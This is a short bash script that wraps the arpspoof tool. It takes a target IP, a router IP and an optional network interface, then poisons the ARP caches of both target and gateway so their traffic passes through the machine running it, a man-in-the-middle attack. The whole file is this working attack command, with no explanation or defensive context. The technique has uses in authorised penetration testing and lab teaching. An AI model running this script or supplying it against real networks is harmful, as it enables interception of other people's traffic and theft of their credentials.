#!/bin/bash

if [ "$#" -lt 2 ] || [ "$#" -gt 3 ]; then
    echo "usage: $0 <targetIP> <routeIP> [networkCardName]"
    exit 1
fi

targetIP=$1
routeIP=$2
networkCardName=${3:-eth0}

arpspoof -i "$networkCardName" -t "$targetIP" -r "$routeIP"
